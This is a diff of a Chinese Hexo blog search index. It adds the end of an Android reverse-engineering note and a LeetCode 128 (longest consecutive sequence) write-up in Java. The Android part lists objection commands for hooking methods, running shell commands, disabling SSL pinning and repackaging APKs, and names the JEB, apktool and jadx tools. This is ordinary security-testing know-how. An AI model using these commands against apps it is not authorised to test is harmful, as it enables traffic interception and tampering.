+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">memory</span> <span class="keyword">list</span> modules       查看当前进程的内存情况</span><br><span class="line"><span class="keyword">memory</span> <span class="keyword">search</span> --string --offsets-only  搜索内存</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/assets/image-20200607203457762.png" alt="image-20200607203457762"></p>
+<ul>
+<li>hook方式</li>
+</ul>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">android </span>hooking watch class_method 包名.类名.方法名</span><br><span class="line"><span class="keyword">android </span>hooking watch class 包名.类名</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行命令行命令</li>
+</ul>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="attribute">android</span> shell_exec<span class="meta"> [command]</span></span><br><span class="line">[command]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>下载文件</li>
+</ul>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">file</span> download 目标文件 存放地址</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>启动activies/services</li>
+</ul>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">android <span class="built_in">int</span>ent lanuch_activity [活动名]</span><br><span class="line">android <span class="built_in">int</span>ent launch_service [类名]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>绕过 sslpinning </li>
+</ul>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">android </span>sslpinning disable</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200607205622609.png" alt="image-20200607205622609"></p>
+<h3><span id="方法二-重新打包apk">方法二 重新打包apk</span></h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">objection patchapk <span class="comment">--source app-release.apk</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/assets/image-20200607205914084.png" alt="image-20200607205914084"></p>
+<p>objection 出现Timeout Error</p>
+<p>网上也不建议采用这种方式注入。</p>
+<h1><span id="逆向工具安装">逆向工具安装</span></h1><h2><span id="jeb">JEB</span></h2><p>JEB是类似于IDA的android逆向工具，从吾爱破解爱盘3.0下载pro版本的即可。免安装。</p>
+<p>测试：<br><img src="/assets/image-20200608102044844.png" alt="image-20200608102044844"></p>
+<p>可以看出会apk文件包含资源文件和字节码，JEB可以分析字节码并点击解析可以逆向为android文件。</p>
+<h2><span id="apktool">Apktool</span></h2><p>下载是个jar包，利用</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">apktool</span><span class="selector-class">.jar</span> <span class="selector-tag">d</span> 目标文件</span><br></pre></td></tr></table></figure>
+
+<p>即可反汇编。</p>
+<h2><span id="jadx">Jadx</span></h2><p>有gui和图形界面，直接使用即可。</p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Leetcode128-最长连续序列</title>
+    <url>/%E7%AE%97%E6%B3%95/Leetcode128-%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%BA%8F%E5%88%97/</url>
+    <content><![CDATA[<p>给定一个未排序的整数数组，找出最长连续序列的长度。</p>
+<p>要求算法的时间复杂度为 O(n)。</p>
+<p>示例:</p>
+<p>输入: [100, 4, 200, 1, 3, 2]<br>输出: 4<br>解释: 最长连续序列是 [1, 2, 3, 4]。它的长度为 4。</p>
+<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/longest-consecutive-sequence" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-consecutive-sequence</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
+<a id="more"></a>
+
+<h2><span id="方法一-插入排序算法">方法一、插入排序算法。</span></h2><p>首先插入排序，然后扫描一遍，求出最大连续长度。时间复杂度o(n^2)，空间复杂度o(n)</p>
+<h2><span id="方法二-内外循环判断法">方法二、内外循环判断法</span></h2><p>外层循环为从开始扫描到终点。</p>
+<p>内层循环为对每一个数num,扫描整个数组看num-1是否存在。</p>
+<p>如果num-1不存在，则找到num+1,num+2,…一直找到num+n。</p>
+<p>如果num-1存在，则因为num-1为连续序列的起点肯定比num好，所以不需再寻找。</p>
+<p>这样的时间复杂度为O(n^2)</p>
+<p>我们可以将时间复杂度降低一下，最开始用一个集合来存所有数。然后每次判断的时候判断num-1是否在集合里即可。</p>
+<p>注意HashSet底层是HashMap，查询时间复杂度为O(1).所以整个算法的平均时间复杂度为o(n)，空间复杂度为o(n)</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            set.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> num = nums[i];</span><br><span class="line">            <span class="keyword">if</span>(!set.contains(num-<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="keyword">int</span> len = <span class="number">1</span>;</span><br><span class="line">                num = num+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(set.contains(num))&#123;</span><br><span class="line">                    num++;</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">                maxLen = maxLen&gt;len?maxLen:len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/assets/image-20200606095540690.png" alt="image-20200606095540690"></p>
+<h2><span id="方法三-treeset方法">方法三、TreeSet方法</span></h2><p>TreeSet可以自动排序，所以可以采用TreeSet的方法。TreeSet查询时间复杂度为o(nlogn)，新增复杂度为o(nlogn)。</p>
+<p>这样时间复杂度为o(nlogn)，空间复杂度为o(n)</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeSet&lt;Integer&gt; treeSet = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            treeSet.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lastNum = treeSet.pollFirst();</span><br><span class="line">        <span class="keyword">int</span> curLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num:treeSet) &#123;</span><br><span class="line">            <span class="keyword">if</span>(lastNum + <span class="number">1</span> == num)&#123;</span><br><span class="line">                curLen++;</span><br><span class="line">                lastNum = num;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(lastNum == num)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                maxLen = curLen&gt;maxLen?curLen:maxLen;</span><br><span class="line">                lastNum = num;</span><br><span class="line">                curLen = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        maxLen = curLen&gt;maxLen?curLen:maxLen;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/assets/image-20200606102923384.png" alt="image-20200606102923384"></p>
+<h2><span id="方法四-使用并查集思想">方法四、使用并查集思想</span></h2><p>并查集包含两个动作，查找和合并。</p>
+<p>此处查找为查找根节点。合并为合并两个相邻节点。但是其实合并没必要，所以将并查集做了优化。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Integer,Integer&gt; set = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    HashMap&lt;Integer,Integer&gt; count = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(set.containsKey(num-<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">int</span> value = set.get(num-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(value != num-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//代表找过</span></span><br><span class="line">                set.put(num,value);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//代表没找过</span></span><br><span class="line">                value = find(value);</span><br><span class="line">                set.put(num, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            set.put(num,num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:set.keySet())&#123;</span><br><span class="line">            <span class="keyword">int</span> parent = set.get(i);</span><br><span class="line">            <span class="keyword">if</span>(parent == i)&#123;</span><br><span class="line">                parent = find(i);</span><br><span class="line">            &#125;</span><br><span class="line">            Integer value = count.get(parent);</span><br><span class="line">            <span class="keyword">if</span>(value == <span class="keyword">null</span>)&#123;</span><br><span class="line">                value = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            value += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(value &gt; maxLen)&#123;</span><br><span class="line">                maxLen = value;</span><br><span class="line">            &#125;</span><br><span class="line">            count.put(parent,value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/assets/image-20200606133225708.png" alt="image-20200606133225708"></p>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Leetcode238-除自身以外数组的乘积</title>
     <url>/%E7%AE%97%E6%B3%95/Leetcode238-%E9%99%A4%E8%87%AA%E8%BA%AB%E4%BB%A5%E5%A4%96%E6%95%B0%E7%BB%84%E7%9A%84%E4%B9%98%E7%A7%AF/</url>
     <content><![CDATA[<p>给你一个长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。</p>
@@ -449,11 +855,6 @@
         <tag>hack_the_box</tag>
         <tag>sql注入</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>MyWebServer1靶机练习</title>
-    <url>/uncategorized/MyWebServer1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>XXE漏洞实验</title>
